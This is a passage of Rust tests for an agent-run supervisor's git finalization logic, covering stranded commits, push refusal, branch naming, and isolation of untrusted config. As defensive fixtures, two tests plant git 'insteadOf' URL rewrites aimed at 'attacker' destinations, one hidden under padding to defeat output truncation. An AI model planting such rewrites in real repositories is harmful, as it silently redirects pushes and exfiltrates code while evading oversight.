        // rather than report a clean config and push to a possibly-rewritten URL.
        let dir = git_workspace("fin-trunc").await;
        let t = Duration::from_secs(30);
        let cfg = dir_path(&dir).join(".git").join("config");
        let mut blob = String::new();
        // The hidden rewrite, first — truncation drops the leading bytes.
        blob.push_str("[url \"file:///nonexistent/attacker\"]\n\tinsteadOf = https://github.com/o/r.git\n");
        // Pad the listing well past GIT_STDOUT_TAIL (1 MiB) with benign entries.
        let pad = "x".repeat(200);
        for i in 0..8000 {
            blob.push_str(&format!("[nano \"k{i}\"]\n\tv = {pad}\n"));
        }
        {
            use std::io::Write;
            let mut f = std::fs::OpenOptions::new().append(true).open(&cfg).unwrap();
            f.write_all(blob.as_bytes()).unwrap();
        }
        let res = neutralize_untrusted_local_config(&dir, t).await;
        assert!(
            res.is_err(),
            "a config listing larger than the captured stdout tail must fail closed, got {res:?}"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn finalize_does_not_strand_checked_out_remote_branch() {
        // Provision snapshots remote-tracking tips too, so a branch the agent
        // created by checking out a pre-existing `refs/remotes/origin/*` branch
        // is recognised as pre-existing (its tip is a provision-time commit) and
        // NOT condemned as stranded agent work. Without the remote tips in the
        // snapshot, finalize would misclassify it and retain the run dir.
        let dir = git_workspace("fin-remote").await;
        let t = Duration::from_secs(30);
        // Build a commit that will be the pre-existing remote branch tip, then
        // record it under refs/remotes/origin/* and drop the local head — exactly
        // the shape a fresh clone leaves (branch present only as remote-tracking).
        git(
            &["checkout".into(), "-b".into(), "feat/pre".into()],
            Some(&dir),
            t,
            None,
        )
        .await
        .unwrap();
        commit(&dir, "pre-existing remote work").await;
        let pre_sha = git(
            &["rev-parse".into(), "HEAD".into()],
            Some(&dir),
            t,
            None,
        )
        .await
        .unwrap()
        .trim()
        .to_string();
        git(
            &["checkout".into(), "main".into()],
            Some(&dir),
            t,
            None,
        )
        .await
        .unwrap();
        git(
            &[
                "update-ref".into(),
                "refs/remotes/origin/feat/pre".into(),
                pre_sha.clone(),
            ],
            Some(&dir),
            t,
            None,
        )
        .await
        .unwrap();
        git(
            &["branch".into(), "-D".into(), "feat/pre".into()],
            Some(&dir),
            t,
            None,
        )
        .await
        .unwrap();

        // Trusted push destination.
        let bare = std::env::temp_dir().join(format!(
            "nano-bare-rt-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        git(
            &[
                "init".into(),
                "--bare".into(),
                "--".into(),
                bare.to_string_lossy().into_owned(),
            ],
            Some(&dir),
            t,
            None,
        )
        .await
        .unwrap();
        let mut repo = test_repo();
        repo.url = format!("file://{}", bare.display());

        // Provision snapshot taken here — must include origin/feat/pre's tip.
        let prep =
            prepare_work_branch(&dir, &repo, Some("main"), Some("feat/work"), true, "u-rt", t).await;
        assert_eq!(prep.working_branch.as_deref(), Some("feat/work"));
        assert!(
            prep.provision_shas
                .as_ref()
                .is_some_and(|s| s.contains(&pre_sha)),
            "the provision snapshot must capture the remote-tracking tip"
        );
        commit(&dir, "agent work on the push branch").await;
        // Agent checks out the pre-existing remote branch, creating a local head
        // absent from refs/heads/ at provision but whose tip pre-existed.
        git(
            &[
                "checkout".into(),
                "-b".into(),
                "feat/pre".into(),
                "refs/remotes/origin/feat/pre".into(),
            ],
            Some(&dir),
            t,
            None,
        )
        .await
        .unwrap();

        let res = finalize_git(&dir, &prep, &repo, t).await;
        assert!(
            res.pushed,
            "the work branch push must succeed; checked-out remote branch must not block it"
        );
        assert!(
            !res.retain,
            "a checked-out pre-existing remote branch must NOT be condemned as stranded work"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
        let _ = std::fs::remove_dir_all(&bare);
    }

    #[tokio::test]
    async fn finalize_strands_commit_parked_only_on_remote_tracking_ref() {
        // Regression for the safety-sweep gap: a commit parked ONLY under an
        // agent-advanced `refs/remotes/*` ref (reachable from no local branch)
        // is stranded agent work — the run dir holds its only copy, so finalize
        // must RETAIN, not push the prepared branch and reap it away.
        let dir = git_workspace("fin-rt-park").await;
        let t = Duration::from_secs(30);
        let bare = std::env::temp_dir().join(format!(
            "nano-bare-rt-park-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        git(
            &[
                "init".into(),
                "--bare".into(),
                "--".into(),
                bare.to_string_lossy().into_owned(),
            ],
            Some(&dir),
            t,
            None,
        )
        .await
        .unwrap();
        let mut repo = test_repo();
        repo.url = format!("file://{}", bare.display());

        let prep =
            prepare_work_branch(&dir, &repo, Some("main"), Some("feat/work"), true, "u-rtp", t)
                .await;
        assert_eq!(prep.working_branch.as_deref(), Some("feat/work"));

        // Build the agent commit WITHOUT moving HEAD (via `commit-tree`), then
        // park it under a remote-tracking ref. A plain `git commit` + `reset`
        // would move HEAD onto the commit and record it in the HEAD reflog, so
        // the SIBLING detached-commit net (which scans the HEAD reflog) would
        // independently catch it there — and this test could never go red if the
        // `refs/remotes/*` sweep regressed. Keeping HEAD on the provision tip the
        // whole time leaves the parked commit reachable from NO local branch and
        // NO HEAD-reflog position — only from `refs/remotes/origin/parked` — so
        // this test isolates that one sweep.
        let head = git(&["rev-parse".into(), "HEAD".into()], Some(&dir), t, None)
            .await
            .unwrap()
            .trim()
            .to_string();
        let tree = git(
            &["rev-parse".into(), "HEAD^{tree}".into()],
            Some(&dir),
            t,
            None,
        )
        .await
        .unwrap()
        .trim()
        .to_string();
        let parked = git(
            &[
                "-c".into(),
                "user.email=t@t".into(),
                "-c".into(),
                "user.name=t".into(),
                "commit-tree".into(),
                tree,
                "-p".into(),
                head,
                "-m".into(),
                "agent work parked on a remote-tracking ref".into(),
            ],
            Some(&dir),
            t,
            None,
        )
        .await
        .unwrap()
        .trim()
        .to_string();
        git(
            &[
                "update-ref".into(),
                "refs/remotes/origin/parked".into(),
                parked.clone(),
            ],
            Some(&dir),
            t,
            None,
        )
        .await
        .unwrap();

        let res = finalize_git(&dir, &prep, &repo, t).await;
        assert!(
            res.retain,
            "a commit parked only on an agent-advanced remote-tracking ref must be retained, \
             not reaped"
        );
        assert!(
            !res.pushed,
            "finalize must not report a clean push while stranded work is retained"
        );
        assert!(
            res.work_found,
            "the stranded commit is real work and must feed the empty-job detector"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
        let _ = std::fs::remove_dir_all(&bare);
    }

    #[tokio::test]
    async fn trusted_fetch_source_reanchors_relative_local_url() {
        // Regression for the finalize push URL: a relative local `repo.url` must
        // be re-anchored to the supervisor cwd (as `provision()` did for the
        // clone), not re-resolved against the finalize checkout's cwd.
        let cwd = std::env::current_dir().unwrap();
        let (fetch, cred) = trusted_fetch_source("./origin.git");
        let want = cwd.join("./origin.git").to_string_lossy().into_owned();
        assert_eq!(fetch, want, "a relative local source must be re-anchored");
        assert!(cred.is_none(), "a credential-free source yields no credential");

        // Remote URLs and absolute paths pass through unchanged.
        let (remote, _) = trusted_fetch_source("https://github.com/o/r.git");
        assert_eq!(remote, "https://github.com/o/r.git");
        let abs = if cfg!(windows) { "C:/x/y.git" } else { "/x/y.git" };
        let (abs_out, _) = trusted_fetch_source(abs);
        assert_eq!(abs_out, abs);
    }

    async fn empty_base_workspace(tag: &str) -> CwdHandle {
        let uniq = format!(
            "nano-empty-{tag}-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        );
        let dir = std::env::temp_dir().join(uniq);
        std::fs::create_dir_all(&dir).unwrap();
        let dir = std::fs::canonicalize(&dir).unwrap();
        let handle = CwdHandle::open(&dir).unwrap();
        git(
            &["init".into(), "-b".into(), "main".into(), "--".into()],
            Some(&handle),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        handle
    }

    #[tokio::test]
    async fn finalize_flags_side_branch_work_on_empty_base() {
        // On an empty/unborn base (`start_sha` is `None`) the stranded-work nets
        // must still run: a commit the agent stranded on a side branch must flag
        // retain, not be silently skipped because there is no base SHA to anchor
        // the range on.
        let dir = empty_base_workspace("side").await;
        // Agent creates the work branch with a commit, then a side branch with
        // its own commit, and leaves HEAD on the work branch.
        git(
            &["checkout".into(), "-b".into(), "feat/work".into(), "--".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        commit(&dir, "work commit").await;
        git(
            &["checkout".into(), "-b".into(), "feat/side".into(), "--".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        commit(&dir, "stranded side commit").await;
        git(
            &["checkout".into(), "feat/work".into(), "--".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let prep = GitPrep {
            working_branch: Some("feat/work".into()),
            want_push: true,
            start_sha: None,
            provision_tips: Some(std::collections::BTreeMap::new()),
            provision_shas: Some(std::collections::BTreeSet::new()),
        };
        let res = finalize_git(&dir, &prep, &test_repo(), Duration::from_secs(30)).await;
        assert!(
            res.retain,
            "side-branch work on an empty base must flag retain (nets must not be skipped when \
             start_sha is None)"
        );
        assert!(
            !res.pushed,
            "stranded side-branch work on an empty base must not be reported as pushed"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn finalize_flags_detached_work_on_empty_base() {
        // Companion to the side-branch case: a DETACHED-HEAD commit stranded on
        // an empty/unborn base must be caught by the reflog net even though
        // `start_sha` is `None` (every uncovered reflog position is then
        // post-provisioning agent work).
        let dir = empty_base_workspace("detached").await;
        git(
            &["checkout".into(), "-b".into(), "feat/work".into(), "--".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        commit(&dir, "work commit").await;
        // Detach, commit, then switch back — the commit is on no branch.
        git(
            &["checkout".into(), "--detach".into(), "HEAD".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        commit(&dir, "stranded detached commit").await;
        git(
            &["checkout".into(), "feat/work".into(), "--".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let prep = GitPrep {
            working_branch: Some("feat/work".into()),
            want_push: true,
            start_sha: None,
            provision_tips: Some(std::collections::BTreeMap::new()),
            provision_shas: Some(std::collections::BTreeSet::new()),
        };
        let res = finalize_git(&dir, &prep, &test_repo(), Duration::from_secs(30)).await;
        assert!(
            res.retain,
            "a stranded detached-HEAD commit on an empty base must flag retain via the reflog net"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn finalize_scans_side_branches_when_push_disabled() {
        // Regression for the review finding: the side-branch safety net must run
        // even when `working_branch` is `None` (the normal `branch.push = false`
        // read-only path). An agent that commits on a side branch and switches
        // back leaves the final HEAD unchanged and the reflog net skips the
        // commit (a local branch contains it), so without this sweep `retain`
        // stayed false and the only copy was reaped.
        let dir = git_workspace("nopush-side").await;
        // Agent creates a side branch with its own commit, then returns to main.
        git(
            &["checkout".into(), "-b".into(), "feat/side".into(), "--".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        commit(&dir, "stranded side commit").await;
        git(
            &["checkout".into(), "main".into(), "--".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        // No prepared work branch and push disabled: the read-only path.
        let prep = GitPrep {
            working_branch: None,
            want_push: false,
            start_sha: None,
            provision_tips: Some(std::collections::BTreeMap::new()),
            provision_shas: Some(std::collections::BTreeSet::new()),
        };
        let res = finalize_git(&dir, &prep, &test_repo(), Duration::from_secs(30)).await;
        assert!(
            res.retain,
            "a side-branch commit with push disabled must flag retain (the sweep must run even \
             when working_branch is None)"
        );
        assert!(
            res.work_found,
            "the stranded side-branch commit is real work — work_found must be set so the run is \
             not misread as empty"
        );
        assert!(!res.pushed, "push is disabled, so nothing is pushed");
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn finalize_refuses_push_when_scan_incomplete() {
        // Regression for the review finding: a scan that could not account for
        // every agent commit sets `retain`, and that must REFUSE the push — a
        // push that publishes only the prepared branch while reporting
        // `pushed = true` would let the run dir (holding the unaccounted work's
        // only copy) be reaped. Here the stranded side-branch commit trips
        // `retain`; the work branch's own (clean) commit must NOT be pushed.
        let dir = git_workspace("refuse-push").await;
        let prep = prepare_work_branch(&dir, &test_repo(), None, None, true, "u5", Duration::from_secs(30)).await;
        let branch = prep.working_branch.clone().expect("a fallback branch is cut");
        // Commit clean work on the work branch, then strand a commit on a side
        // branch and switch back.
        commit(&dir, "clean work-branch commit").await;
        git(
            &["checkout".into(), "-b".into(), "feat/side".into(), "--".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        commit(&dir, "stranded side commit").await;
        git(
            &["checkout".into(), branch.clone(), "--".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let res = finalize_git(&dir, &prep, &test_repo(), Duration::from_secs(30)).await;
        assert!(res.retain, "stranded side-branch work must flag retain");
        assert!(
            !res.pushed,
            "retain (incomplete/stranded scan) must REFUSE the push — never publish a partial \
             account as pushed"
        );
        assert!(
            res.work_found,
            "real work was found, so work_found must be set even though the push was refused"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn finalize_marks_work_found_for_stranded_detached_commit() {
        // Companion to `finalize_flags_stranded_detached_head_commit`: the
        // detached-HEAD net must ALSO set `work_found` (distinct from `retain`),
        // because the stranded commit is on no branch and `commits` stays empty
        // — without it a quiet commit-only run reads as an empty job and its
        // retry wipes the only copy.
        let dir = git_workspace("detached-wf").await;
        let prep = prepare_work_branch(&dir, &test_repo(), None, None, true, "u6", Duration::from_secs(30)).await;
        let branch = prep.working_branch.clone().expect("a fallback branch is cut");
        // Detach, commit, then switch back — the commit is on no branch.
        git(
            &["checkout".into(), "--detach".into(), "HEAD".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        commit(&dir, "stranded detached commit").await;
        git(
            &["checkout".into(), branch.clone(), "--".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let res = finalize_git(&dir, &prep, &test_repo(), Duration::from_secs(30)).await;
        assert!(res.retain, "a stranded detached-HEAD commit must flag retain");
        assert!(
            res.work_found,
            "a stranded detached-HEAD commit is real work — work_found must be set"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[test]
    fn bounded_fallback_segment_caps_long_base() {
        // A base name longer than the cap is truncated to it (on a char
        // boundary), never splitting a multi-byte char.
        let long = "a".repeat(MAX_FALLBACK_SEGMENT + 100);
        let seg = bounded_fallback_segment(&long);
        assert_eq!(seg.chars().count(), MAX_FALLBACK_SEGMENT);

        // A short base is untouched.
        assert_eq!(bounded_fallback_segment("main"), "main");

        // Trailing separators are re-trimmed after the cut, so the composed ref
        // never ends a component in `-`/`.`/`/`. Build a segment whose char at
        // the cut point is a separator: 199 `a`s then a `-` at position 200.
        let mut mixed = "a".repeat(MAX_FALLBACK_SEGMENT - 1);
        mixed.push('-');
        mixed.push_str(&"b".repeat(50));
        let seg = bounded_fallback_segment(&mixed);
        assert!(seg.chars().count() <= MAX_FALLBACK_SEGMENT);
        assert!(
            !seg.ends_with(['-', '.', '/']),
            "trailing separator must be re-trimmed, got {seg:?}"
        );

        // A multi-byte char is counted as one char (not its UTF-8 width), so a
        // segment mixing ASCII and wide chars is still capped by char count.
        // (Non-ASCII is itself mapped to `-` by the sanitizer; the point here
        // is that the cap counts chars, not bytes.)
        let wide = format!("{}{}", "a".repeat(MAX_FALLBACK_SEGMENT - 1), "éééé");
        let seg = bounded_fallback_segment(&wide);
        assert!(seg.chars().count() <= MAX_FALLBACK_SEGMENT);
    }

    #[tokio::test]
    async fn branch_cut_bounds_long_base_fallback_ref() {
        // Regression for the review finding: a valid-but-long base name fits as
        // the cloned branch, but appending `-<pid>-<nanos>` must not push the
        // composed fallback ref past the filesystem ref-name limit (which would
        // fail `checkout -B` and leave finalize pushing nothing). The composed
        // ref must be bounded and validate with `git check-ref-format`.
        let dir = git_workspace("longbase").await;
        let long_base = "base/".to_string() + &"a".repeat(400);
        let prep = prepare_work_branch(
            &dir,
            &test_repo(),
            Some(&long_base),
            None,
            true,
            "u9",
            Duration::from_secs(30),
        )
        .await;
        let branch = prep
            .working_branch
            .expect("a fallback branch is cut for a base-naming create");
        assert!(branch.starts_with("nano/agent-work/"));
        // The composed ref is bounded and is a valid branch name.
        assert!(
            branch.len() < 255,
            "composed fallback ref must be bounded, got {} chars: {branch:?}",
            branch.len()
        );
        let ok = git(
            &["check-ref-format".into(), "--branch".into(), branch.clone()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await;
        assert!(
            ok.is_ok(),
            "composed fallback ref must validate: {branch:?}"
        );
        // And it was actually checked out (the checkout did not fail on length).
        let on = git(
            &["rev-parse".into(), "--abbrev-ref".into(), "HEAD".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        assert_eq!(on.trim(), branch);
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn finalize_complete_branch_listing_does_not_retain() {
        // The completeness guard must NOT false-positive on a healthy repo: when
        // every branch genuinely fits in the stdout tail, the successor probe on
        // the last-sorting branch finds no `refs/heads/` successor, so `retain`
        // stays false. Here several branches exist (so the listing is non-empty
        // and the probe runs) but nothing is stranded and the work branch is
        // clean — a false positive would retain every healthy run.
        let dir = git_workspace("complete-listing").await;
        let prep = prepare_work_branch(
            &dir,
            &test_repo(),
            None,
            Some("feat/work"),
            true,
            "u-complete",
            Duration::from_secs(30),
        )
        .await;
        assert_eq!(prep.working_branch.as_deref(), Some("feat/work"));
        // Extra branches that sort both before and after the work branch, so the
        // last-sorting branch is exercised by the successor probe. None carries
        // post-provisioning work (all point at the base commit), so nothing is
        // stranded.
        for b in ["aaa-side", "zzz-side"] {
            git(
                &["branch".into(), b.into()],
                Some(&dir),
                Duration::from_secs(30),
                None,
            )
            .await
            .unwrap();
        }
        // Clean work on the work branch only.
        commit(&dir, "clean work").await;
        let (repo, bare) = repo_with_reachable_remote(&dir).await;
        let res = finalize_git(&dir, &prep, &repo, Duration::from_secs(30)).await;
        assert!(
            !res.retain,
            "a complete branch listing with no stranded work must not be retained (the \
             completeness probe must not false-positive on a healthy repo)"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
        let _ = std::fs::remove_dir_all(&bare);
    }

    #[tokio::test]
    async fn finalize_maximum_probe_anchors_the_last_branch() {
        // Behavioral regression for the LAST-anchor completeness probe: the global
        // maximum branch (`for-each-ref --count=1 --sort=-refname refs/heads/`) is
        // the branch the parsed listing MUST end with. A tail that dropped TRAILING
        // refs parses an earlier last branch, so `parsed_last != maximum` — the
        // signature the guard flags. Uses only valid `for-each-ref` flags (the old
        // `--start-after` probe was not a real git option and failed closed on
        // every git, over-retaining every healthy multi-branch run).
        let dir = git_workspace("max-probe").await;
        // Branches sorted aaa-side < feat/work < main < zzz-side, plus a tag
        // (tags sort AFTER every refs/heads/ ref but are excluded by the pattern).
        for b in ["aaa-side", "feat/work", "zzz-side"] {
            git(
                &["branch".into(), b.into()],
                Some(&dir),
                Duration::from_secs(30),
                None,
            )
            .await
            .unwrap();
        }
        git(
            &["tag".into(), "v1".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let maximum = git(
            &[
                "for-each-ref".into(),
                "--count=1".into(),
                "--sort=-refname".into(),
                "--format=%(refname:short)".into(),
                "refs/heads/".into(),
            ],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap()
        .trim()
        .to_string();
        // The true maximum is the alphabetically-last branch (the tag is excluded
        // by the `refs/heads/` pattern, so it never masquerades as the maximum).
        assert_eq!(maximum, "zzz-side");
        // A complete listing ends with it; a trailing-truncated listing (which
        // would end at, say, feat/work) does NOT equal the maximum -> flagged.
        let complete_last = "zzz-side";
        let truncated_last = "feat/work";
        assert_eq!(complete_last, maximum, "complete listing ends at the maximum");
        assert_ne!(
            truncated_last, maximum,
            "a listing that dropped the trailing zzz-side ends at feat/work != maximum, so the \
             last-anchor probe flags it"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn finalize_minimum_probe_anchors_the_first_branch() {
        // Behavioral regression for the FIRST-anchor completeness probe: the global
        // minimum branch (`for-each-ref --count=1 refs/heads/`) is the branch the
        // parsed listing MUST start with. A tail that dropped LEADING refs parses a
        // later first branch, so `parsed_first != minimum` — the signature the
        // guard flags. This pins the probe: the minimum is independent of how much
        // of the tail was retained, so it catches the leading-truncation bypass the
        // successor-only check misses.
        let dir = git_workspace("min-probe").await;
        // Branches sorted aaa-side < feat/work < main < zzz-side.
        for b in ["aaa-side", "feat/work", "zzz-side"] {
            git(
                &["branch".into(), b.into()],
                Some(&dir),
                Duration::from_secs(30),
                None,
            )
            .await
            .unwrap();
        }
        let minimum = git(
            &[
                "for-each-ref".into(),
                "--count=1".into(),
                "--format=%(refname:short)".into(),
                "refs/heads/".into(),
            ],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap()
        .trim()
        .to_string();
        // The true minimum is the alphabetically-first branch.
        assert_eq!(minimum, "aaa-side");
        // A complete listing starts with it; a leading-truncated listing (which
        // would start at, say, feat/work) does NOT equal the minimum -> flagged.
        let complete_first = "aaa-side";
        let truncated_first = "feat/work";
        assert_eq!(complete_first, minimum, "complete listing starts at the minimum");
        assert_ne!(
            truncated_first, minimum,
            "a listing that dropped the leading aaa-side starts at feat/work != minimum, so the \
             first-anchor probe flags it"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn branch_cut_prepares_work_branch_on_unborn_repo() {
        // An empty/unborn repository has a symbolic branch but no resolvable
        // HEAD, so `rev-parse --abbrev-ref HEAD` exits nonzero and (before the
        // fix) left `checked_out`/`working_branch` = None — the agent's first
        // commit could never be pushed. Reading the SYMBOLIC ref instead yields
        // the unborn branch, so a fallback is cut and finalize can push.
        let dir = empty_base_workspace("unborn-cut").await;
        let prep = prepare_work_branch(
            &dir,
            &test_repo(),
            None,
            None,
            true,
            "uu1",
            Duration::from_secs(30),
        )
        .await;
        let branch = prep
            .working_branch
            .clone()
            .expect("an unborn base must still yield a fallback work branch");
        assert!(
            branch.starts_with("nano/agent-work/"),
            "expected a fallback branch off the unborn base, got {branch:?}"
        );
        // The checkout is on the (still-unborn) fallback, and the agent's first
        // commit lands on it.
        let on = git(
            &["symbolic-ref".into(), "--short".into(), "-q".into(), "HEAD".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        assert_eq!(on.trim(), branch);
        commit(&dir, "first work").await;
        let res = finalize_git(&dir, &prep, &test_repo(), Duration::from_secs(30)).await;
        assert_eq!(
            res.commits.len(),
            1,
            "the agent's first commit on the fallback is enumerated, got {:?}",
            res.commits
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn finalize_does_not_condemn_preexisting_divergent_side_branch() {
        // Regression for the classification false positive: a side branch that
        // PRE-EXISTED provisioning (e.g. a remote branch the agent merely
        // checked out) carries its own divergent history, which satisfies a
        // bare `start_sha..ref` count — but the agent created none of it. The
        // provision-time tip snapshot must classify it as pre-existing and NOT
        // strand it (which would clear the real work-branch commits and refuse
        // the push).
        let dir = git_workspace("fin-preexist").await; // checkout on `main`, one commit
        // Create a pre-existing divergent side branch BEFORE provisioning.
        git(
            &["branch".into(), "preexisting".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let prep = prepare_work_branch(
            &dir,
            &test_repo(),
            None,
            None,
            true,
            "uu2",
            Duration::from_secs(30),
        )
        .await;
        let branch = prep
            .working_branch
            .clone()
            .expect("a fallback branch is cut off main");
        assert!(branch.starts_with("nano/agent-work/"));
        // The agent commits on the fallback work branch; `preexisting` is left
        // untouched (its tip equals the provision-time snapshot).
        commit(&dir, "real work").await;
        let (repo, bare) = repo_with_reachable_remote(&dir).await;
        let res = finalize_git(&dir, &prep, &repo, Duration::from_secs(30)).await;
        // The pre-existing branch must NOT be mistaken for stranded agent work:
        // `commits` stays populated (not cleared by the stranded-work path) and
        // `retain` is not set by a misclassification. (The push lands on the
        // reachable remote, so `pushed` is true and does not itself retain.)
        assert_eq!(
            res.commits.len(),
            1,
            "the work-branch commit is enumerated and not cleared, got {:?}",
            res.commits
        );
        assert!(
            !res.retain,
            "a pre-existing divergent side branch must not trip the stranded-work net"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
        let _ = std::fs::remove_dir_all(&bare);
    }

    #[tokio::test]
    async fn finalize_flags_agent_created_side_branch_despite_snapshot() {
        // The mirror of the above: a side branch the agent DID create and
        // commit on after provisioning is absent from the snapshot, so it must
        // still be flagged as stranded work (retain, push refused) — the
        // snapshot must not excuse genuinely new branches.
        let dir = git_workspace("fin-newside").await;
        let prep = prepare_work_branch(
            &dir,
            &test_repo(),
            None,
            None,
            true,
            "uu3",
            Duration::from_secs(30),
        )
        .await;
        assert!(prep.working_branch.is_some());
        // Agent creates a NEW side branch and commits on it, then switches back.
        git(
            &["checkout".into(), "-b".into(), "agent-side".into(), "--".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        commit(&dir, "stranded side work").await;
        git(
            &[
                "checkout".into(),
                prep.working_branch.clone().unwrap(),
                "--".into(),
            ],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let res = finalize_git(&dir, &prep, &test_repo(), Duration::from_secs(30)).await;
        assert!(
            res.retain,
            "an agent-created side branch with unpublished commits must retain the run dir"
        );
        assert!(
            res.work_found,
            "the stranded side-branch commit is real work and must be signalled"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    /// Serializes tests that mutate the process-wide `GIT_CONFIG_GLOBAL` env
    /// var (a global side effect), and restores the prior value on drop. A
    /// `tokio::sync::Mutex` because the guard is held across `.await`.
    static GIT_CONFIG_ENV_LOCK: tokio::sync::Mutex<()> = tokio::sync::Mutex::const_new(());
    struct GitConfigGlobalGuard(Option<std::ffi::OsString>);
    impl Drop for GitConfigGlobalGuard {
        fn drop(&mut self) {
            match &self.0 {
                Some(v) => std::env::set_var("GIT_CONFIG_GLOBAL", v),
                None => std::env::remove_var("GIT_CONFIG_GLOBAL"),
            }
        }
    }

    #[tokio::test]
    async fn finalize_push_ignores_global_insteadof_rewrite() {
        // The agent shares the daemon's HOME, so a `url.*.insteadOf` planted in
        // the GLOBAL config would redirect the trusted push off-box even though
        // the local scrub cleaned `.git/config`. The push must run with the
        // global config isolated so the planted rewrite never applies.
        let dir = git_workspace("fin-global-io").await;
        let bare = std::env::temp_dir().join(format!(
            "nano-bare-gio-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        git(
            &[
                "init".into(),
                "--bare".into(),
                "--".into(),
                bare.to_string_lossy().into_owned(),
            ],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let mut repo = test_repo();
        let trusted = format!("file://{}", bare.display());
        repo.url = trusted.clone();
        let prep = prepare_work_branch(
            &dir,
            &repo,
            None,
            Some("feat/work"),
            true,
            "uu4",
            Duration::from_secs(30),
        )
        .await;
        assert_eq!(prep.working_branch.as_deref(), Some("feat/work"));
        commit(&dir, "work to push").await;
        // Plant the redirect in a scratch "global" config (the real HOME is
        // never touched — the test binds this file explicitly via
        // GIT_CONFIG_GLOBAL instead, so the rewrite is genuinely live for any
        // git invocation that does NOT isolate the global config).
        let fake_home = std::env::temp_dir().join(format!(
            "nano-home-gio-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&fake_home).unwrap();
        let fake_global = fake_home.join(".gitconfig");
        // The attacker destination is a real bare repo: a redirected push
        // SUCCEEDS there, so "push failed" can never be mistaken for "rewrite
        // ignored" (and vice versa — landing on the attacker proves the
        // rewrite fired).
        let attacker = std::env::temp_dir().join(format!(
            "nano-attacker-gio-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        git(
            &[
                "init".into(),
                "--bare".into(),
                "--".into(),
                attacker.to_string_lossy().into_owned(),
            ],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let attacker_url = format!("file://{}", attacker.display());
        std::fs::write(
            &fake_global,
            format!("[url \"{attacker_url}\"]\n\tinsteadOf = {trusted}\n"),
        )
        .unwrap();
        // Bind the planted config to EVERY git invocation this test spawns by
        // setting the process-wide GIT_CONFIG_GLOBAL. This is the crux: the
        // finalize push inherits the test process's environment, so the
        // planted rewrite is genuinely live for it UNLESS `git_isolated`
        // overrides GIT_CONFIG_GLOBAL to /dev/null. (Binding via `-c` instead
        // would not exercise the env-override path that IS the fix; binding
        // via HOME would not work because this host's git reads its global
        // config from $XDG_CONFIG_HOME/git/config, not $HOME/.gitconfig.)
        // Serialized + restored because the env var is a process-global side
        // effect.
        let _env_lock = GIT_CONFIG_ENV_LOCK.lock().await;
        let _env_guard = GitConfigGlobalGuard(std::env::var_os("GIT_CONFIG_GLOBAL"));
        std::env::set_var("GIT_CONFIG_GLOBAL", &fake_global);
